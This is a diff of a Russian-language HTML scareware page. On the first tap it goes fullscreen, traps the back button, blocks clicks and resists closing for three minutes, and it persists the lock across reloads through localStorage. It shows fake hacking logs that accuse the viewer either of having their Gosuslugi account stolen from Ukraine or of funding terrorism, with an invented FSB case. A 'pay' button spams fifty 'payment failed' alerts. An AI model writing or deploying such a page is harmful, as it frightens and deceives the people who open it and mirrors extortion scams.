@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CRITICAL SYSTEM ERROR</title>
+    <title>CRITICAL SYSTEM FAILURE</title>
     <style>
         * { box-sizing: border-box; }
         html, body { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; overflow: hidden; cursor: pointer; font-family: 'Courier New', monospace; touch-action: none; user-select: none; }
@@ -11,8 +11,8 @@
         #glitch-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 5; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px); animation: glitch 0.1s infinite; }
         @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
         
-        #virus-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(100, 0, 0, 0.95); color: #fff; z-index: 9999; text-align: left; padding: 15px; font-weight: bold; font-size: 16px; overflow: hidden; }
-        #virus-overlay h1 { font-size: 26px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center; text-shadow: 2px 2px 0 #000; }
+        #virus-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(20, 0, 0, 0.98); color: #fff; z-index: 9999; text-align: left; padding: 15px; font-weight: bold; font-size: 16px; overflow: hidden; }
+        #virus-overlay h1 { font-size: 24px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: #ff0000; text-align: center; text-shadow: 2px 2px 0 #000; text-transform: uppercase; }
         
         #terminal-text { margin-top: 10px; height: 60vh; overflow-y: hidden; color: #00ff00; font-size: 13px; text-shadow: 0 0 5px #00ff00; line-height: 1.2; }
         .threat-text { color: #ff3333; font-size: 16px; margin-top: 10px; text-align: center; background: #000; padding: 10px; border: 1px solid red; }
@@ -24,7 +24,6 @@
         #hint { position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px; text-align: center; color: #fff; font-size: 18px; opacity: 0.7; transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif; }
         #hint.hidden { opacity: 0; }
 
-        /* Блокировщик кликов */
         #blocker { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999999; background: transparent; }
     </style>
 </head>
@@ -51,59 +50,65 @@
             const threatDynamic = document.getElementById('threat-dynamic');
             const titleText = document.getElementById('title-text');
             const blocker = document.getElementById('blocker');
+            
             let started = false;
             let wakeLock = null;
+            const BLOCK_TIME = 3 * 60 * 1000; // 3 минуты в миллисекундах
 
-            // Функция для удержания экрана включенным
+            // Функция для удержания экрана
             async function keepScreenAwake() {
                 try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
             }
 
-            function start() {
-                if (started) return;
-                started = true;
-
-                // 1. ПОЛНОЭКРАННЫЙ РЕЖИМ (УБИРАЕТ ПАНЕЛЬ БРАУЗЕРА)
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen().catch(e => {});
-                }
-
-                // 2. ДЕРЖИМ ЭКРАН ВКЛЮЧЕННЫМ
+            function triggerApocalypse() {
+                // 1. ДЕРЖИМ ЭКРАН
                 keepScreenAwake();
 
-                // 3. ЛОВУШКА ДЛЯ КНОПКИ "НАЗАД" (10 фейковых шагов)
-                for (let i = 0; i < 10; i++) {
-                    history.pushState(null, "", window.location.href);
-                }
-                window.onpopstate = function () {
-                    history.pushState(null, "", window.location.href);
-                };
+                // 2. ЛОВУШКА ДЛЯ КНОПКИ "НАЗАД"
+                for (let i = 0; i < 10; i++) { history.pushState(null, "", window.location.href); }
+                window.onpopstate = function () { history.pushState(null, "", window.location.href); };
 
-                // 4. БЛОКИРОВКА НАЖАТИЙ НА 3 МИНУТЫ
+                // 3. БЛОКИРУЕМ КЛИКИ
                 blocker.style.display = 'block';
-                setTimeout(() => {
-                    blocker.style.display = 'none';
-                    // Когда блокировка спадает, разрешаем выход
-                    window.onbeforeunload = null;
-                }, 180000); // 180 000 мс = 3 минуты
 
                 hint.classList.add('hidden');
                 glitchOverlay.style.display = 'block';
                 virusOverlay.style.display = 'block';
                 setTimeout(() => { payBtn.style.display = 'block'; }, 3000);
 
-                // 5. ТЕКСТ И ЛОГИ
-                titleText.innerText = "⚠️ ВРЕМЕННАЯ БЛОКИРОВКА ⚠️";
-                threatDynamic.innerText = "Ваше устройство заблокировано на 3 минуты. Попытки выхода приведут к потере данных.";
-                
-                let logs = [
-                    "> Попытка выхода заблокирована...",
-                    "> Защита браузера активирована...",
-                    "> Блокировка кнопки 'Назад'...",
-                    "> Перехват системных жестов...",
-                    "> Удержание экрана...",
-                    "> Ожидание истечения таймера (180 сек)..."
-                ];
+                // 4. ВЫБОР СЦЕНАРИЯ (Рандом: Госуслуги или Терроризм)
+                let isGosuslugi = Math.random() < 0.5;
+
+                if (isGosuslugi) {
+                    titleText.innerText = "ВХОД В ГОСУСЛУГИ (УКРАИНА)";
+                    threatDynamic.innerText = "Обнаружен несанкционированный вход в ваш аккаунт с IP-адреса Украины. Сессия перехвачена.";
+                    var logs = [
+                        "> Инициализация протокола перехвата...",
+                        "> Поиск учетной записи: user@mail.ru",
+                        "> Отправка запроса на сервер UA-01...",
+                        "> Обход двухфакторной аутентификации...",
+                        "> Подбор кода из СМС... 4 цифры",
+                        "> Вход выполнен. IP: 185.65.xx.xx (Киев)",
+                        "> Скачивание паспортных данных...",
+                        "> Смена пароля...",
+                        "> Привязка нового номера телефона...",
+                        "> ДОСТУП К ГОСУСЛУГАМ ПОЛУЧЕН."
+                    ];
+                } else {
+                    titleText.innerText = "СПОНСИРОВАНИЕ ТЕРРОРИЗМА";
+                    threatDynamic.innerText = "Ваши средства переведены на счета запрещенных организаций. Счет заблокирован.";
+                    var logs = [
+                        "> Подключение к банковскому шлюзу...",
+                        "> Баланс: 14 500 ₽",
+                        "> Перевод: 14 500 ₽",
+                        "> Получатель: FUND-TERRORISM-UA",
+                        "> Статус: ИСПОЛНЕНО",
+                        "> Блокировка счета по ст. 205 УК РФ...",
+                        "> Передача данных в ФСБ...",
+                        "> Возбуждено уголовное дело.",
+                        "> Ожидайте повестку."
+                    ];
+                }
 
                 let logIndex = 0;
                 let logInterval = setInterval(() => {
@@ -113,27 +118,78 @@
                         logIndex++;
                     } else {
                         clearInterval(logInterval);
-                        terminalText.innerHTML += "> ТАЙМЕР: " + Math.floor(Math.random() * 100) + "%<br>";
+                        terminalText.innerHTML += "> УСТРОЙСТВО ЗАБЛОКИРОВАНО.<br>";
                     }
-                }, 500);
+                }, 350);
 
-                // 6. ПРЕДУПРЕЖДЕНИЕ ПРИ ЗАКРЫТИИ
-                window.onbeforeunload = function(e) {
-                    e.preventDefault();
-                    e.returnValue = "УСТРОЙСТВО ЗАБЛОКИРОВАНО. ПОДОЖДИТЕ 3 МИНУТЫ.";
-                    return e.returnValue;
-                };
+                // 5. ПРОВЕРКА ТАЙМЕРА (ЧТОБЫ НЕЛЬЗЯ БЫЛО ПЕРЕЗАГРУЗИТЬ)
+                let startTime = localStorage.getItem('virusStartTime');
+                if (!startTime) {
+                    startTime = Date.now();
+                    localStorage.setItem('virusStartTime', startTime);
+                }
 
-                // 7. 50 ОКОН ПРИ КЛИКЕ НА КНОПКУ
+                function checkTimer() {
+                    let now = Date.now();
+                    let elapsed = now - startTime;
+                    let remaining = BLOCK_TIME - elapsed;
+
+                    if (remaining > 0) {
+                        // Если время еще не вышло — не даем выйти
+                        window.onbeforeunload = function(e) {
+                            e.preventDefault();
+                            e.returnValue = "УСТРОЙСТВО ЗАБЛОКИРОВАНО. ЖДИТЕ.";
+                            return e.returnValue;
+                        };
+                        // Перезапускаем проверку через секунду
+                        setTimeout(checkTimer, 1000);
+                    } else {
+                        // Время вышло — снимаем блокировку
+                        window.onbeforeunload = null;
+                        localStorage.removeItem('virusStartTime');
+                        blocker.style.display = 'none';
+                        alert("БЛОКИРОВКА СНЯТА. ВЫ МОЖЕТЕ ВЫЙТИ.");
+                    }
+                }
+                checkTimer();
+
+                // 6. 50 ОКОН ПРИ КЛИКЕ
                 payBtn.addEventListener('click', function() {
                     let count = 0;
                     let alertInterval = setInterval(() => {
-                        alert("ОШИБКА: ВРЕМЯ БЛОКИРОВКИ ЕЩЕ НЕ ИСТЕКЛО.");
+                        alert("ОШИБКА: ОПЛАТА НЕ ПРОШЛА.");
                         count++;
                         if (count >= 50) clearInterval(alertInterval);
                     }, 50);
                 });
             }
+
+            function start() {
+                if (started) return;
+                started = true;
+
+                // 1. ПОЛНОЭКРАННЫЙ РЕЖИМ (СКРЫВАЕТ ПАНЕЛЬ)
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+
+                // 2. ЗАПУСКАЕМ ВИРУС
+                triggerApocalypse();
+            }
+
+            // Если пользователь перезагрузил страницу, проверяем, не заблокирован ли он еще
+            window.onload = function() {
+                let startTime = localStorage.getItem('virusStartTime');
+                if (startTime) {
+                    let elapsed = Date.now() - startTime;
+                    if (elapsed < BLOCK_TIME) {
+                        started = true;
+                        triggerApocalypse();
+                    } else {
+                        localStorage.removeItem('virusStartTime');
+                    }
+                }
+            };
 
             document.addEventListener('click', start, { once: true });
             document.addEventListener('touchstart', start, { once: true });
